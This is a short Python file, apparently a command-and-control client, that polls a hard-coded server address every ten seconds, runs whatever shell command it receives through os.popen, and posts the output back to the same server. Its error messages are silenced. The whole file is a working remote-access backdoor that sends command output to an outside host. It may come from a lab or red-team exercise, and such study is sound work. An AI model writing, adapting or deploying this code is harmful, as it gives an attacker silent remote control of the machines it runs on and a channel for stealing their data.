# c2_client.py - Ethan Zeevi
import requests
import time
import os

# change to server IP
SERVER_URL = "http://100.64.4.223:5000"

# Grabs command from http endpoint
def get_command():
    try:
        response = requests.get(f"{SERVER_URL}/command")
        command = response.json().get('command', '')
        return command
    except Exception as e:
        #print(f"Error fetching command: {e}")
        return ""

# Send result data to http endpoint
def send_result(result):
    try:
        response = requests.post(f"{SERVER_URL}/result", json={'result': result})
        return response.json().get('status', '')
    except Exception as e:
        #print(f"Error sending result: {e}")
        pass

# uses popen to execute the command sent from c2server
def execute_command(command):
    if command == "":
        return "No command received."
    
    try:
        # Execute the command and get output
        output = os.popen(command).read()
        return output if output else "Command executed with no output."
    except Exception as e:
        return f"Error executing command: {e}"

# Checks the endpoint every 10 seconds to grab new command(s)
if __name__ == "__main__":
    while True:
        command = get_command()
        if command:
            #print(f"Received command: {command}")
            result = execute_command(command)
            #print(f"Command result: {result}")
            send_result(result)
        time.sleep(10) 
